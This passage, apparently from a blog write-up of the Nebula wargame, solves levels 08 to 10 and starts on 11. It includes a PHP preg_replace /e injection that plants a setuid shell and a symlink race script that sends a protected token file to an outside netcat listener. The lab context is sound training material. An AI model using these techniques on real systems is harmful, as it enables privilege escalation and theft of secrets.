</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level08:2941ec772c52d0561257d6ef26aa317a">Level08</h3>

<p>Description:</p>

<blockquote>
<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
</blockquote>

<p>This level has a world readable capture.pcap file in flag08&rsquo;s home folder. After SCPing it out and viewing it in wireshark,
we can extract the plaintext password:</p>

<p><img src="/images/2016/05/01/wireshark.png" alt="wireshark" /></p>

<p>The password seen in the screenshot is <code>backdoor...00Rm8.ate</code>, hoewever, the dots here are actually <code>0x7F</code> characters (which is Backspace),
so the correct password is <code>backd00Rmate</code>
With this password we can get the flag:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Flag08</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level08@nebula:/home/flag08$ su flag08 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level09:2941ec772c52d0561257d6ef26aa317a">Level09</h3>

<p>Description:</p>

<blockquote>
<p>There’s a C setuid wrapper for some vulnerable PHP code…</p>
</blockquote>

<p>

<figure class="code">
  <figcaption>
  	<span>Source Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&lt;?php</span>

<span style="color: #66d9ef">function</span> <span style="color: #a6e22e">spam</span><span style="color: #f8f8f2">($email)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #f8f8f2">$email</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/\./&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot; dot &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$email);</span>
  <span style="color: #f8f8f2">$email</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/@/&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot; AT &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$email);</span>
  
  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">$email;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">function</span> <span style="color: #a6e22e">markup</span><span style="color: #f8f8f2">($filename,</span> <span style="color: #f8f8f2">$use_me)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">file_get_contents($filename);</span>

  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/(\[email (.*)\])/e&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;spam(</span><span style="color: #ae81ff">\&quot;\\</span><span style="color: #e6db74">2</span><span style="color: #ae81ff">\&quot;</span><span style="color: #e6db74">)&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$contents);</span>
  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/\[/&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;&lt;&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$contents);</span>
  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/\]/&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;&gt;&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$contents);</span>

  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">$contents;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #f8f8f2">$output</span> <span style="color: #f92672">=</span> <span style="color: #a6e22e">markup</span><span style="color: #f8f8f2">($argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">$argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">]);</span>

<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">$output;</span>

<span style="color: #75715e">?&gt;</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>This code has <code>preg_replace with /e modifier</code> vulnerability.
Googling this vulnerability we find a post that details the exploitation <a href="http://www.madirish.net/402">here</a> .</p>

<p>The vulnerability in our case can be exploited by passing commands via second parameter (which is unused in the code itself), or,
as described in the post, via first parameter&rsquo;s file contents:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>File Contents</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">[email ${`shell commands`}]
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>The full exploit (again reusing setuid shell):</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Flag09</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level09@nebula:/home/flag09$ cat /tmp/phpshell 
<span style="color: #f92672">[</span>email <span style="color: #e6db74">${`</span>cp /tmp/shell /home/flag09/shell <span style="color: #f92672">&amp;&amp;</span> chmod <span style="color: #ae81ff">4755</span> /home/flag09/shell<span style="color: #e6db74">`}</span><span style="color: #f92672">]</span>

level09@nebula:/home/flag09$ ./flag09 /tmp/phpshell 1
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php<span style="color: #f92672">(</span>15<span style="color: #f92672">)</span> : regexp code on line 1


level09@nebula:/home/flag09$ ls -al
total 21
drwxr-x--- <span style="color: #ae81ff">1</span> flag09 level09   <span style="color: #ae81ff">60</span> 2016-05-01 01:20 .
drwxr-xr-x <span style="color: #ae81ff">1</span> root   root     <span style="color: #ae81ff">120</span> 2012-08-27 07:18 ..
-rw-r--r-- <span style="color: #ae81ff">1</span> flag09 flag09   <span style="color: #ae81ff">220</span> 2011-05-18 02:54 .bash_logout
-rw-r--r-- <span style="color: #ae81ff">1</span> flag09 flag09  <span style="color: #ae81ff">3353</span> 2011-05-18 02:54 .bashrc
-rwsr-x--- <span style="color: #ae81ff">1</span> flag09 level09 <span style="color: #ae81ff">7240</span> 2011-11-20 21:22 flag09
-rw-r--r-- <span style="color: #ae81ff">1</span> root   root     <span style="color: #ae81ff">491</span> 2011-11-20 21:22 flag09.php
-rw-r--r-- <span style="color: #ae81ff">1</span> flag09 flag09   <span style="color: #ae81ff">675</span> 2011-05-18 02:54 .profile
-rwsr-xr-x <span style="color: #ae81ff">1</span> flag09 level09 <span style="color: #ae81ff">7322</span> 2016-05-01 01:20 shell
level09@nebula:/home/flag09$ ./shell
flag09@nebula:/home/flag09$ getflag 
You have successfully executed getflag on a target account
flag09@nebula:/home/flag09$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level10:2941ec772c52d0561257d6ef26aa317a">Level10</h3>

<p>Description:</p>

<blockquote>
<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>
</blockquote>

<p>

<figure class="code">
  <figcaption>
  	<span>Source Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;unistd.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdio.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;fcntl.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;errno.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;sys/socket.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;netinet/in.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;string.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">file;</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">host;</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">&lt;</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s file host</span><span style="color: #ae81ff">\n\t</span><span style="color: #e6db74">sends file to host if you have access to it</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
      <span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">file</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">];</span>
  <span style="color: #f8f8f2">host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">];</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(access(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">R_OK)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd;</span>
      <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">ffd;</span>
      <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">rc;</span>
      <span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">sockaddr_in</span> <span style="color: #f8f8f2">sin;</span>
      <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buffer[</span><span style="color: #ae81ff">4096</span><span style="color: #f8f8f2">];</span>

      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Connecting to %s:18211 .. &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">host);</span> <span style="color: #f8f8f2">fflush(stdout);</span>

      <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket(AF_INET,</span> <span style="color: #f8f8f2">SOCK_STREAM,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>

      <span style="color: #f8f8f2">memset(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">sin,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">sockaddr_in));</span>
      <span style="color: #f8f8f2">sin.sin_family</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">AF_INET;</span>
      <span style="color: #f8f8f2">sin.sin_addr.s_addr</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">inet_addr(host);</span>
      <span style="color: #f8f8f2">sin.sin_port</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">htons(</span><span style="color: #ae81ff">18211</span><span style="color: #f8f8f2">);</span>

      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(connect(fd,</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">sin,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">sockaddr_in))</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
          <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to connect to host %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">host);</span>
          <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
      <span style="color: #f8f8f2">}</span>

<span style="color: #75715e">#define HITHERE &quot;.oO Oo.\n&quot;</span>
      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(write(fd,</span> <span style="color: #f8f8f2">HITHERE,</span> <span style="color: #f8f8f2">strlen(HITHERE))</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
          <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to write banner to host %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">host);</span>
          <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
      <span style="color: #f8f8f2">}</span>
<span style="color: #75715e">#undef HITHERE</span>

      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Connected!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">Sending file .. &quot;</span><span style="color: #f8f8f2">);</span> <span style="color: #f8f8f2">fflush(stdout);</span>

      <span style="color: #f8f8f2">ffd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(file,</span> <span style="color: #f8f8f2">O_RDONLY);</span>
      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(ffd</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
          <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Damn. Unable to open file</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
          <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
      <span style="color: #f8f8f2">}</span>

      <span style="color: #f8f8f2">rc</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">read(ffd,</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buffer));</span>
      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(rc</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
          <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to read from file: %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">strerror(errno));</span>
          <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
      <span style="color: #f8f8f2">}</span>

      <span style="color: #f8f8f2">write(fd,</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #f8f8f2">rc);</span>

      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;wrote file!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>

  <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;You don&#39;t have access to %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">file);</span>
  <span style="color: #f8f8f2">}</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>This code is vulnerable to &ldquo;time of check to time of use&rdquo; race condition. It has its own wiki <a href="https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use">article</a>.
The logic of the (SETUID) code here and the one in the article is basically the same - check if the current user has access to a file and if so - process the file.</p>

<p>To exploit this logic we need to first pass in the file that we have access to (to pass the check) and later switch it out (symlink) to another file (which we WANT to access).
The timing is crucial here and the race needs to be automated.
I wrote the following script:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Race Condition</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/bin/bash</span>

rm -rf /tmp/access
touch /tmp/access
/home/flag10/flag10 /tmp/access 192.168.56.1 <span style="color: #f8f8f2">&amp;</span>
ln -sf /home/flag10/token /tmp/access
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>After a few attempts we receive the token to our netcat listener:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Token</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# nc -lkp 18211
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
root@kali:~# 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Back inside the Nebula VM:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Flag10</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level10@nebula:/home/flag10$ su flag10 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level11:2941ec772c52d0561257d6ef26aa317a">Level11</h3>

<h4 id="description:2941ec772c52d0561257d6ef26aa317a">Description:</h4>

<blockquote>
<p><em>The /home/flag11/flag11 binary processes standard input and executes a shell command.</em>
<em>There are two ways of completing this level, you may wish to do both :-)</em></p>
</blockquote>

<p>

<figure class="code">
  <figcaption>
  	<span>Source Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;unistd.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;string.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;fcntl.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdio.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;sys/mman.h&gt;</span>

<span style="color: #75715e">/*</span>
<span style="color: #75715e"> * Return a random, non predictable file, and return the file descriptor for it.</span>
<span style="color: #75715e"> */</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">getrand</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">path)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">tmp;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">pid;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd;</span>

  <span style="color: #f8f8f2">srandom(time(NULL));</span>

  <span style="color: #f8f8f2">tmp</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getenv(</span><span style="color: #e6db74">&quot;TEMP&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">pid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getpid();</span>
  
  <span style="color: #f8f8f2">asprintf(path,</span> <span style="color: #e6db74">&quot;%s/%d.%c%c%c%c%c%c&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">tmp,</span> <span style="color: #f8f8f2">pid,</span>
      <span style="color: #e6db74">&#39;A&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;0&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">10</span><span style="color: #f8f8f2">),</span>
      <span style="color: #e6db74">&#39;a&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;A&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">),</span>
      <span style="color: #e6db74">&#39;0&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">10</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;a&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">));</span>

  <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">path,</span> <span style="color: #f8f8f2">O_CREAT</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">O_RDWR,</span> <span style="color: #ae81ff">0600</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">unlink(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">path);</span>
  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">fd;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">process</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">buffer,</span> <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">length)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">unsigned</span> <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">key;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i;</span>

  <span style="color: #f8f8f2">key</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">length</span> <span style="color: #f92672">&amp;</span> <span style="color: #ae81ff">0xff</span><span style="color: #f8f8f2">;</span>

  <span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">&lt;</span> <span style="color: #f8f8f2">length;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">buffer[i]</span> <span style="color: #f92672">^=</span> <span style="color: #f8f8f2">key;</span>
      <span style="color: #f8f8f2">key</span> <span style="color: #f92672">-=</span> <span style="color: #f8f8f2">buffer[i];</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">system(buffer);</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #75715e">#define CL &quot;Content-Length: &quot;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">line[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">];</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">mem;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">length;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd;</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">path;</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fgets(line,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(line),</span> <span style="color: #f8f8f2">stdin)</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">errx(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;reading from stdin&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #f8f8f2">CL,</span> <span style="color: #f8f8f2">strlen(CL))</span> <span style="color: #f92672">!=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">errx(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;invalid header&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">length</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">atoi(line</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">strlen(CL));</span>
  
  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(length</span> <span style="color: #f92672">&lt;</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf))</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fread(buf,</span> <span style="color: #f8f8f2">length,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">stdin)</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">length)</span> <span style="color: #f8f8f2">{</span>
          <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;fread length&quot;</span><span style="color: #f8f8f2">);</span>
      <span style="color: #f8f8f2">}</span>
      <span style="color: #f8f8f2">process(buf,</span> <span style="color: #f8f8f2">length);</span>
  <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">blue</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">length;</span>
      <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">pink;</span>

